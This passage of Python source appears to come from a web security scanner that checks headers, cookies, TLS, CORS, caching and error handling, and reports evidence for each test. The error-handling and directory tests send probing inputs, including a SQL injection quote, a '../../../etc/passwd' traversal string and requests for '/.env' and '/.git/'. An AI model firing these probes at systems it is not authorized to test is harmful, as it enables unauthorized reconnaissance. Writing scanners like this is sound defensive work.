                    evidence += f"  ✅ All security attributes present\n"
                
                evidence += "\n"
            
            if overall_issues:
                evidence += f"🚨 Summary: {len(overall_issues)} security issues found\n"
                evidence += f"💡 Recommendation: Implement missing cookie security attributes"
                
                return {
                    'result': 'fail',
                    'evidence': evidence,
                    'request': full_request,
                    'response': full_response
                }
            else:
                evidence += f"✅ Summary: All cookies have proper security attributes"
                
                return {
                    'result': 'pass',
                    'evidence': evidence,
                    'request': full_request,
                    'response': full_response
                }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing cookies: {str(e)}',
                'request': f'GET {url}',
                'response': 'Request failed - no response received'
            }

    @staticmethod
    def test_security_headers(url):
        """Test for common security headers"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            security_headers = {
                'X-Frame-Options': 'Prevents clickjacking attacks',
                'X-Content-Type-Options': 'Prevents MIME type sniffing',
                'X-XSS-Protection': 'Enables XSS filtering',
                'Content-Security-Policy': 'Prevents XSS and data injection',
                'Referrer-Policy': 'Controls referrer information',
                'Permissions-Policy': 'Controls browser features',
                'Cross-Origin-Embedder-Policy': 'Controls cross-origin embedding',
                'Cross-Origin-Opener-Policy': 'Controls cross-origin window opening'
            }
            
            missing_headers = []
            present_headers = []
            highlight_headers = []
            
            for header, description in security_headers.items():
                if header in response.headers:
                    present_headers.append(f'✅ {header}: {response.headers[header]}')
                    highlight_headers.append(header)
                else:
                    missing_headers.append(f'❌ {header} ({description})')
            
            # Format full request and response with highlighting
            full_request = AutoTestService._format_request_details('GET', url, headers)
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            evidence = "🛡️  Security Headers Analysis\n\n"
            
            if present_headers:
                evidence += f"Present security headers ({len(present_headers)}):\n"
                for header in present_headers:
                    evidence += f"  {header}\n"
                evidence += "\n"
            
            if missing_headers:
                evidence += f"🚨 Missing security headers ({len(missing_headers)}):\n"
                for header in missing_headers:
                    evidence += f"  {header}\n"
                evidence += "\n"
                evidence += f"💡 Recommendation: Implement missing security headers to improve protection\n"
                evidence += f"   against common web attacks (XSS, clickjacking, MIME sniffing, etc.)"
            else:
                evidence += f"✅ All recommended security headers are present!"
            
            result = 'fail' if missing_headers else 'pass'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing security headers: {str(e)}',
                'request': f'GET {url}',
                'response': 'Request failed - no response received'
            }

    @staticmethod
    def test_ssl_configuration(url):
        """Test SSL/TLS configuration"""
        try:
            parsed_url = urlparse(url)
            if parsed_url.scheme != 'https':
                return {
                    'result': 'fail',
                    'evidence': '🚨 URL does not use HTTPS\n\nHTTP connections are vulnerable to:\n  • Man-in-the-middle attacks\n  • Data eavesdropping\n  • Content tampering\n\n💡 Recommendation: Use HTTPS for all web communications',
                    'request': f'SSL test for {url}',
                    'response': 'Non-HTTPS URL detected - SSL test skipped'
                }
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            # Test SSL connection with verification
            response = requests.get(url, headers=headers, timeout=10, verify=True)
            
            # Format request and response
            full_request = AutoTestService._format_request_details('GET', url, headers)
            full_response = AutoTestService._format_response_details(response)
            
            # If we get here, SSL is valid
            evidence = "✅ SSL/TLS Certificate Validation\n\n"
            evidence += f"🔒 Certificate Status: Valid and Trusted\n"
            evidence += f"🌐 URL: {url}\n"
            evidence += f"📊 Response Code: {response.status_code}\n\n"
            evidence += f"🛡️  Security Benefits:\n"
            evidence += f"  • Data encrypted in transit\n"
            evidence += f"  • Certificate authority verified\n"
            evidence += f"  • Protection against MITM attacks"
            
            return {
                'result': 'pass',
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
            
        except requests.exceptions.SSLError as e:
            ssl_error = str(e)
            evidence = f"🚨 SSL/TLS Certificate Error\n\n"
            evidence += f"❌ Error Details: {ssl_error}\n\n"
            evidence += f"🔍 Common SSL Issues:\n"
            evidence += f"  • Self-signed certificate\n"
            evidence += f"  • Expired certificate\n"
            evidence += f"  • Invalid certificate chain\n"
            evidence += f"  • Hostname mismatch\n\n"
            evidence += f"💡 Recommendation: Fix SSL certificate issues before production deployment"
            
            return {
                'result': 'fail',
                'evidence': evidence,
                'request': f'SSL verification for {url}',
                'response': f'SSL Error: {ssl_error}'
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing SSL: {str(e)}',
                'request': f'SSL test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_http_methods(url):
        """Test for allowed HTTP methods"""
        try:
            methods_to_test = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
            allowed_methods = []
            risky_methods = []
            method_details = []
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            for method in methods_to_test:
                try:
                    response = requests.request(method, url, headers=headers, timeout=5, verify=False)
                    if response.status_code not in [405, 501]:  # Method not allowed or not implemented
                        allowed_methods.append(method)
                        method_details.append(f"  • {method}: {response.status_code} {response.reason}")
                        
                        if method in ['TRACE', 'DELETE', 'PUT', 'PATCH']:
                            risky_methods.append(method)
                except:
                    method_details.append(f"  • {method}: Connection failed")
            
            # Create a sample request for documentation
            full_request = AutoTestService._format_request_details('OPTIONS', url, headers)
            
            evidence = f"🔍 HTTP Methods Analysis\n\n"
            evidence += f"📊 Methods Tested: {', '.join(methods_to_test)}\n"
            evidence += f"✅ Allowed Methods: {', '.join(allowed_methods) if allowed_methods else 'None detected'}\n\n"
            
            evidence += f"📋 Detailed Results:\n"
            for detail in method_details:
                evidence += detail + "\n"
            evidence += "\n"
            
            if risky_methods:
                evidence += f"⚠️  Potentially Risky Methods Found: {', '.join(risky_methods)}\n\n"
                evidence += f"🚨 Security Implications:\n"
                for method in risky_methods:
                    if method == 'TRACE':
                        evidence += f"  • TRACE: Can reveal proxy information and enable XST attacks\n"
                    elif method == 'DELETE':
                        evidence += f"  • DELETE: Can be used to delete resources if not properly protected\n"
                    elif method in ['PUT', 'PATCH']:
                        evidence += f"  • {method}: Can modify resources if not properly protected\n"
                
                evidence += f"\n💡 Recommendation: Review if these methods are necessary and properly secured"
                result = 'fail'
            else:
                evidence += f"✅ No risky HTTP methods detected - only safe methods are allowed"
                result = 'pass'
            
            response_summary = f"HTTP Methods Test Results:\nAllowed: {', '.join(allowed_methods)}\nRisky: {', '.join(risky_methods) if risky_methods else 'None'}"
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': response_summary
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing HTTP methods: {str(e)}',
                'request': f'HTTP method test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_information_disclosure(url):
        """Test for information disclosure through various means"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            full_request = AutoTestService._format_request_details('GET', url, headers)
            
            # Check for information disclosure in headers
            disclosure_headers = {
                'Server': 'Web server information',
                'X-Powered-By': 'Technology stack information',
                'X-AspNet-Version': 'ASP.NET version',
                'X-AspNetMvc-Version': 'ASP.NET MVC version',
                'X-Generator': 'Content management system',
                'X-Drupal-Cache': 'Drupal CMS detection',
                'X-Varnish': 'Varnish cache information'
            }
            
            found_disclosures = []
            highlight_headers = []
            
            for header, description in disclosure_headers.items():
                if header in response.headers:
                    found_disclosures.append(f"• {header}: {response.headers[header]} ({description})")
                    highlight_headers.append(header)
            
            # Check for common debug/error information in response body
            debug_patterns = [
                r'(?i)(debug|trace|error|exception|stack\s*trace)',
                r'(?i)(mysql|postgresql|oracle|sql\s*server).*error',
                r'(?i)php\s*(warning|error|notice|fatal)',
                r'(?i)(apache|nginx|iis).*error',
                r'(?i)application\s*error'
            ]
            
            body_issues = []
            for pattern in debug_patterns:
                if re.search(pattern, response.text):
                    body_issues.append(f"• Debug/error information detected in response body")
                    break
            
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            evidence = "🔍 Information Disclosure Analysis\n\n"
            
            if found_disclosures:
                evidence += f"⚠️  Information Disclosure Found ({len(found_disclosures)} issues):\n"
                for disclosure in found_disclosures:
                    evidence += f"  {disclosure}\n"
                evidence += "\n"
            
            if body_issues:
                evidence += f"🚨 Response Body Issues:\n"
                for issue in body_issues:
                    evidence += f"  {issue}\n"
                evidence += "\n"
            
            if found_disclosures or body_issues:
                evidence += f"💡 Recommendation: Remove or minimize information disclosure\n"
                evidence += f"   • Configure server to hide version information\n"
                evidence += f"   • Implement custom error pages\n"
                evidence += f"   • Review debug settings for production"
                result = 'fail'
            else:
                evidence += f"✅ No obvious information disclosure detected\n"
                evidence += f"   • Server headers appear to be properly configured\n"
                evidence += f"   • No debug information found in response"
                result = 'pass'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing information disclosure: {str(e)}',
                'request': f'Information disclosure test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_clickjacking_protection(url):
        """Test for clickjacking protection mechanisms"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            full_request = AutoTestService._format_request_details('GET', url, headers)
            
            # Check for clickjacking protection headers
            x_frame_options = response.headers.get('X-Frame-Options')
            csp_header = response.headers.get('Content-Security-Policy')
            
            highlight_headers = []
            protection_methods = []
            issues = []
            
            if x_frame_options:
                highlight_headers.append('X-Frame-Options')
                if x_frame_options.upper() in ['DENY', 'SAMEORIGIN']:
                    protection_methods.append(f"✅ X-Frame-Options: {x_frame_options}")
                else:
                    issues.append(f"⚠️  X-Frame-Options has weak setting: {x_frame_options}")
            else:
                issues.append("❌ Missing X-Frame-Options header")
            
            if csp_header:
                highlight_headers.append('Content-Security-Policy')
                if 'frame-ancestors' in csp_header:
                    protection_methods.append(f"✅ CSP frame-ancestors directive present")
                else:
                    issues.append(f"⚠️  CSP header present but no frame-ancestors directive")
            
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            evidence = "🛡️  Clickjacking Protection Analysis\n\n"
            
            if protection_methods:
                evidence += f"Protection Methods Found:\n"
                for method in protection_methods:
                    evidence += f"  {method}\n"
                evidence += "\n"
            
            if issues:
                evidence += f"🚨 Issues Found ({len(issues)}):\n"
                for issue in issues:
                    evidence += f"  {issue}\n"
                evidence += "\n"
                evidence += f"💡 Recommendation: Implement clickjacking protection\n"
                evidence += f"   • Add X-Frame-Options: DENY or SAMEORIGIN\n"
                evidence += f"   • Or use CSP frame-ancestors directive\n"
                evidence += f"   • Test embedded content functionality"
                result = 'fail'
            else:
                evidence += f"✅ Clickjacking protection is properly configured"
                result = 'pass'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing clickjacking protection: {str(e)}',
                'request': f'Clickjacking protection test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_cors_configuration(url):
        """Test CORS configuration for potential security issues"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Origin': 'https://evil.example.com'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            full_request = AutoTestService._format_request_details('GET', url, headers)
            
            # Check CORS headers
            cors_headers = {
                'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
                'Access-Control-Allow-Headers': response.headers.get('Access-Control-Allow-Headers'),
                'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                'Access-Control-Max-Age': response.headers.get('Access-Control-Max-Age')
            }
            
            highlight_headers = [h for h in cors_headers.keys() if cors_headers[h]]
            issues = []
            configurations = []
            
            if cors_headers['Access-Control-Allow-Origin']:
                acao = cors_headers['Access-Control-Allow-Origin']
                if acao == '*':
                    if cors_headers['Access-Control-Allow-Credentials'] == 'true':
                        issues.append("🚨 CRITICAL: Wildcard CORS with credentials enabled")
                    else:
                        issues.append("⚠️  Wildcard CORS origin (allows all domains)")
                elif acao == headers['Origin']:
                    issues.append("⚠️  CORS reflects any origin (potential security risk)")
                else:
                    configurations.append(f"✅ CORS origin restricted to: {acao}")
            
            if cors_headers['Access-Control-Allow-Methods']:
                methods = cors_headers['Access-Control-Allow-Methods']
                if any(method in methods for method in ['PUT', 'DELETE', 'PATCH']):
                    issues.append(f"⚠️  Potentially dangerous methods allowed: {methods}")
                else:
                    configurations.append(f"✅ CORS methods: {methods}")
            
            if cors_headers['Access-Control-Allow-Credentials'] == 'true':
                configurations.append("⚠️  Credentials allowed in CORS requests")
            
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            evidence = "🌐 CORS Configuration Analysis\n\n"
            
            if not any(cors_headers.values()):
                evidence += "ℹ️  No CORS headers detected\n"
                evidence += "   • This may be expected for same-origin applications\n"
                evidence += "   • Consider if cross-origin requests are needed"
                result = 'informational'
            else:
                if configurations:
                    evidence += f"CORS Configuration:\n"
                    for config in configurations:
                        evidence += f"  {config}\n"
                    evidence += "\n"
                
                if issues:
                    evidence += f"🚨 Security Issues Found ({len(issues)}):\n"
                    for issue in issues:
                        evidence += f"  {issue}\n"
                    evidence += "\n"
                    evidence += f"💡 Recommendation: Review CORS configuration\n"
                    evidence += f"   • Avoid wildcard origins with credentials\n"
                    evidence += f"   • Restrict origins to trusted domains\n"
                    evidence += f"   • Limit allowed methods and headers"
                    result = 'fail'
                else:
                    evidence += f"✅ CORS configuration appears secure"
                    result = 'pass'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing CORS configuration: {str(e)}',
                'request': f'CORS configuration test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_content_type_validation(url):
        """Test for content type validation and MIME sniffing protection"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            full_request = AutoTestService._format_request_details('GET', url, headers)
            
            # Check content type headers
            content_type = response.headers.get('Content-Type', '')
            x_content_type_options = response.headers.get('X-Content-Type-Options')
            
            highlight_headers = []
            issues = []
            protections = []
            
            if content_type:
                highlight_headers.append('Content-Type')
                if 'charset' not in content_type.lower() and 'text/' in content_type:
                    issues.append(f"⚠️  Missing charset in Content-Type: {content_type}")
                else:
                    protections.append(f"✅ Content-Type properly set: {content_type}")
            else:
                issues.append("❌ Missing Content-Type header")
            
            if x_content_type_options:
                highlight_headers.append('X-Content-Type-Options')
                if x_content_type_options.lower() == 'nosniff':
                    protections.append(f"✅ MIME sniffing protection: {x_content_type_options}")
                else:
                    issues.append(f"⚠️  Weak X-Content-Type-Options: {x_content_type_options}")
            else:
                issues.append("❌ Missing X-Content-Type-Options header")
            
            # Check for potential MIME confusion
            parsed_url = urlparse(url)
            if parsed_url.path.endswith(('.jpg', '.png', '.gif', '.css', '.js')):
                if not content_type or not any(ext in content_type for ext in ['image/', 'text/css', 'javascript']):
                    issues.append("⚠️  Content-Type mismatch with file extension")
            
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            evidence = "📋 Content Type Validation Analysis\n\n"
            
            if protections:
                evidence += f"Protection Mechanisms:\n"
                for protection in protections:
                    evidence += f"  {protection}\n"
                evidence += "\n"
            
            if issues:
                evidence += f"🚨 Issues Found ({len(issues)}):\n"
                for issue in issues:
                    evidence += f"  {issue}\n"
                evidence += "\n"
                evidence += f"💡 Recommendation: Improve content type handling\n"
                evidence += f"   • Always specify Content-Type with charset\n"
                evidence += f"   • Add X-Content-Type-Options: nosniff\n"
                evidence += f"   • Ensure content types match file extensions"
                result = 'fail'
            else:
                evidence += f"✅ Content type validation is properly configured"
                result = 'pass'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing content type validation: {str(e)}',
                'request': f'Content type validation test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_cache_control(url):
        """Test cache control headers for sensitive content"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            full_request = AutoTestService._format_request_details('GET', url, headers)
            
            # Check cache control headers
            cache_control = response.headers.get('Cache-Control')
            pragma = response.headers.get('Pragma')
            expires = response.headers.get('Expires')
            etag = response.headers.get('ETag')
            last_modified = response.headers.get('Last-Modified')
            
            highlight_headers = []
            cache_directives = []
            recommendations = []
            
            if cache_control:
                highlight_headers.append('Cache-Control')
                directives = [d.strip() for d in cache_control.split(',')]
                
                security_directives = ['no-cache', 'no-store', 'must-revalidate', 'private']
                found_security = [d for d in directives if d in security_directives]
                
                if found_security:
                    cache_directives.append(f"✅ Security directives found: {', '.join(found_security)}")
                else:
                    if 'public' in directives:
                        recommendations.append("⚠️  Public caching enabled - review for sensitive content")
                    cache_directives.append(f"ℹ️  Cache directives: {', '.join(directives)}")
            else:
                recommendations.append("❌ Missing Cache-Control header")
            
            if pragma:
                highlight_headers.append('Pragma')
                if pragma.lower() == 'no-cache':
                    cache_directives.append(f"✅ Pragma no-cache directive present")
                else:
                    cache_directives.append(f"ℹ️  Pragma: {pragma}")
            
            if expires:
                highlight_headers.append('Expires')
                cache_directives.append(f"ℹ️  Expires header: {expires}")
            
            if etag:
                highlight_headers.append('ETag')
                cache_directives.append(f"ℹ️  ETag present for cache validation")
            
            if last_modified:
                highlight_headers.append('Last-Modified')
                cache_directives.append(f"ℹ️  Last-Modified: {last_modified}")
            
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            evidence = "🗂️  Cache Control Analysis\n\n"
            
            if cache_directives:
                evidence += f"Cache Configuration:\n"
                for directive in cache_directives:
                    evidence += f"  {directive}\n"
                evidence += "\n"
            
            # Determine if content might be sensitive
            is_sensitive = any(keyword in url.lower() for keyword in 
                             ['login', 'admin', 'profile', 'account', 'secure', 'private'])
            
            if is_sensitive and not any(directive in (cache_control or '') for directive in 
                                      ['no-cache', 'no-store', 'private']):
                recommendations.append("🚨 Potentially sensitive content without proper cache control")
            
            if recommendations:
                evidence += f"🚨 Recommendations ({len(recommendations)}):\n"
                for rec in recommendations:
                    evidence += f"  {rec}\n"
                evidence += "\n"
                evidence += f"💡 Best Practices:\n"
                evidence += f"   • Use 'no-store' for sensitive data\n"
                evidence += f"   • Use 'private' for user-specific content\n"
                evidence += f"   • Set appropriate max-age for static resources"
                result = 'fail' if is_sensitive else 'informational'
            else:
                evidence += f"✅ Cache control appears appropriate for this content"
                result = 'pass'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing cache control: {str(e)}',
                'request': f'Cache control test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_subdomain_takeover(url):
        """Test for potential subdomain takeover vulnerabilities"""
        try:
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            
            # Skip if not a subdomain
            if domain.count('.') < 2:
                return {
                    'result': 'informational',
                    'evidence': f'ℹ️  Not a subdomain: {domain}\n\nSubdomain takeover tests only apply to subdomains.',
                    'request': f'Subdomain takeover test for {url}',
                    'response': 'Test skipped - not a subdomain'
                }
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            evidence = f"🔍 Subdomain Takeover Analysis for {domain}\n\n"
            
            # Test 1: Try to resolve the domain
            try:
                response = requests.get(url, headers=headers, timeout=10, verify=False)
                evidence += f"✅ Domain resolves and responds (Status: {response.status_code})\n"
                
                # Check for common takeover indicators in response
                takeover_indicators = {
                    'github.io': 'There isn\'t a GitHub Pages site here',
                    'herokuapp.com': 'No such app',
                    'azurewebsites.net': 'Web App - Unavailable',
                    'cloudfront.net': 'Bad Request',
                    's3.amazonaws.com': 'NoSuchBucket',
                    'wordpress.com': 'Do you want to register'
                }
                
                response_text = response.text.lower()
                for service, indicator in takeover_indicators.items():
                    if indicator.lower() in response_text:
                        evidence += f"🚨 POTENTIAL TAKEOVER: {service} indicator found!\n"
                        evidence += f"   Indicator: '{indicator}'\n"
                        
                        return {
                            'result': 'fail',
                            'evidence': evidence + f"\n💡 Recommendation: Immediately investigate and secure this subdomain!",
                            'request': f'GET {url}',
                            'response': f'Potential takeover indicator found: {indicator}'
                        }
                
                evidence += f"✅ No obvious takeover indicators in response content\n"
                
            except requests.exceptions.RequestException as e:
                evidence += f"⚠️  Request failed: {str(e)}\n"
                evidence += f"   This could indicate a dangling DNS record\n"
                
                # Try DNS resolution
                try:
                    import socket
                    ip = socket.gethostbyname(domain)
                    evidence += f"   DNS resolves to: {ip}\n"
                except socket.gaierror:
                    evidence += f"🚨 DNS resolution failed - possible dangling record!\n"
                    return {
                        'result': 'fail',
                        'evidence': evidence + f"\n💡 Recommendation: Check DNS records for this subdomain",
                        'request': f'DNS resolution for {domain}',
                        'response': 'DNS resolution failed'
                    }
            
            # Test 2: Check CNAME records if possible
            try:
                import dns.resolver
                cname_records = dns.resolver.resolve(domain, 'CNAME')
                for cname in cname_records:
                    cname_target = str(cname.target)
                    evidence += f"📋 CNAME record found: {cname_target}\n"
                    
                    # Check if CNAME points to common services
                    risky_services = ['github.io', 'herokuapp.com', 'azurewebsites.net', 
                                    'cloudfront.net', 's3.amazonaws.com', 'wordpress.com']
                    
                    for service in risky_services:
                        if service in cname_target:
                            evidence += f"⚠️  CNAME points to {service} - verify service is still active\n"
                            
            except Exception as dns_error:
                evidence += f"ℹ️  DNS CNAME check failed: {str(dns_error)}\n"
            
            evidence += f"\n✅ No immediate subdomain takeover vulnerability detected"
            
            return {
                'result': 'pass',
                'evidence': evidence,
                'request': f'Subdomain takeover test for {url}',
                'response': 'Subdomain appears secure'
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing subdomain takeover: {str(e)}',
                'request': f'Subdomain takeover test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_directory_listing(url):
        """Test for directory listing vulnerabilities"""
        try:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Common directories to test
            test_paths = [
                '/admin/',
                '/backup/',
                '/config/',
                '/uploads/',
                '/files/',
                '/tmp/',
                '/logs/',
                '/assets/',
                '/css/',
                '/js/',
                '/images/',
                '/.git/',
                '/.svn/',
                '/web.config',
                '/.env'
            ]
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            evidence = "📂 Directory Listing & Sensitive Files Test\n\n"
            findings = []
            accessible_dirs = []
            
            for path in test_paths:
                try:
                    test_url = urljoin(base_url, path)
                    response = requests.get(test_url, headers=headers, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        # Check for directory listing patterns
                        listing_patterns = [
                            r'Index of /',
                            r'Directory listing for',
                            r'<title>Index of',
                            r'Parent Directory',
                            r'<a href="\.\."',
                            r'Last modified'
                        ]
                        
                        is_directory_listing = any(re.search(pattern, response.text, re.IGNORECASE) 
                                                 for pattern in listing_patterns)
                        
                        if is_directory_listing:
                            findings.append(f"🚨 Directory listing: {test_url}")
                            accessible_dirs.append(test_url)
                        elif len(response.text) > 100:  # Non-empty response
                            findings.append(f"⚠️  Accessible path: {test_url} (Status: {response.status_code})")
                    
                except requests.exceptions.RequestException:
                    continue  # Path not accessible or error occurred
            
            if findings:
                evidence += f"🚨 Issues Found ({len(findings)}):\n"
                for finding in findings:
                    evidence += f"  {finding}\n"
                evidence += "\n"
                
                if accessible_dirs:
                    evidence += f"💥 CRITICAL: Directory listings expose file structure!\n"
                    evidence += f"💡 Immediate Actions Required:\n"
                    evidence += f"   • Disable directory browsing on web server\n"
                    evidence += f"   • Add index files to directories\n"
                    evidence += f"   • Review file permissions\n"
                    evidence += f"   • Remove sensitive files from web root"
                    result = 'fail'
                else:
                    evidence += f"💡 Recommendations:\n"
                    evidence += f"   • Review accessible paths\n"
                    evidence += f"   • Ensure sensitive files are not web-accessible\n"
                    evidence += f"   • Implement proper access controls"
                    result = 'fail'
            else:
                evidence += f"✅ No directory listings or obvious sensitive files found\n"
                evidence += f"   • Common administrative paths appear protected\n"
                evidence += f"   • No obvious file exposure detected"
                result = 'pass'
            
            # Create request summary
            request_summary = f"Directory Listing Test for {base_url}\nTested {len(test_paths)} common paths"
            response_summary = f"Found {len(findings)} issues" + (f", {len(accessible_dirs)} directory listings" if accessible_dirs else "")
            
            return {
                'result': result,
                'evidence': evidence,
                'request': request_summary,
                'response': response_summary
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing directory listing: {str(e)}',
                'request': f'Directory listing test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_error_handling(url):
        """Test error handling and information disclosure through error messages"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            evidence = "🚨 Error Handling & Information Disclosure Test\n\n"
            error_tests = []
            
            # Test 1: Invalid parameter
            try:
                invalid_url = url + "?id=999999999999999999999"
                response = requests.get(invalid_url, headers=headers, timeout=10, verify=False)
                error_tests.append(('Invalid Parameter', response))
            except:
                pass
            
            # Test 2: SQL injection attempt (for error detection only)
            try:
                sql_url = url + "?id=1'"
                response = requests.get(sql_url, headers=headers, timeout=10, verify=False)
                error_tests.append(('SQL Injection Test', response))
            except:
                pass
            
            # Test 3: Directory traversal attempt
            try:
                traversal_url = url + "/../../../etc/passwd"
                response = requests.get(traversal_url, headers=headers, timeout=10, verify=False)
                error_tests.append(('Directory Traversal', response))
            except:
                pass
            
            # Test 4: Non-existent page
            try:
                nonexistent_url = urljoin(url, "/this-page-does-not-exist-12345")
                response = requests.get(nonexistent_url, headers=headers, timeout=10, verify=False)
                error_tests.append(('404 Error Page', response))
            except:
                pass
            
            # Analyze error responses
            error_patterns = {
                'SQL Errors': [
                    r'mysql.*error', r'postgresql.*error', r'oracle.*error',
                    r'sql.*syntax.*error', r'sqlite.*error', r'sqlserver.*error'
                ],
                'Stack Traces': [
                    r'stack\s*trace', r'exception.*at\s+line', r'traceback',
                    r'\.java:\d+', r'\.php:\d+', r'\.asp:\d+', r'\.py:\d+'
                ],
                'Path Disclosure': [
                    r'[a-z]:\\[^<>"|]+', r'/var/www/', r'/home/', r'/usr/',
                    r'c:\\inetpub\\', r'c:\\windows\\'
                ],
                'Version Info': [
                    r'php/\d+\.\d+', r'apache/\d+\.\d+', r'nginx/\d+\.\d+',
                    r'microsoft-iis/\d+\.\d+', r'\.net\s+framework'
                ]
            }
            
            issues_found = []
            detailed_findings = []
            
            for test_name, response in error_tests:
                if response and hasattr(response, 'text'):
                    response_text = response.text.lower()
                    
                    for category, patterns in error_patterns.items():
                        for pattern in patterns:
                            if re.search(pattern, response_text, re.IGNORECASE):
                                issues_found.append(f"⚠️  {category} in {test_name}")
                                detailed_findings.append(f"   Pattern: {pattern}")
                                break
            
            if issues_found:
                evidence += f"🚨 Information Disclosure Found ({len(issues_found)} issues):\n"
                for i, issue in enumerate(issues_found):
                    evidence += f"  {issue}\n"
                    if i < len(detailed_findings):
                        evidence += f"  {detailed_findings[i]}\n"
                evidence += "\n"
                evidence += f"💡 Recommendations:\n"
                evidence += f"   • Implement custom error pages\n"
                evidence += f"   • Disable debug mode in production\n"
                evidence += f"   • Configure proper error logging\n"
                evidence += f"   • Remove stack traces from responses"
                result = 'fail'
            else:
                evidence += f"✅ Error handling appears secure\n"
                evidence += f"   • No obvious information disclosure in error responses\n"
                evidence += f"   • Error pages do not reveal sensitive details"
                result = 'pass'
            
            request_summary = f"Error Handling Test for {url}\nTested {len(error_tests)} error conditions"
            response_summary = f"Analyzed error responses for information disclosure"
            
            return {
                'result': result,
                'evidence': evidence,
                'request': request_summary,
                'response': response_summary
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing error handling: {str(e)}',
                'request': f'Error handling test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_http_security_features(url):
        """Test for modern HTTP security features and best practices"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            full_request = AutoTestService._format_request_details('GET', url, headers)
            
            # Modern security headers to check
            modern_headers = {
                'Expect-CT': 'Certificate Transparency monitoring',
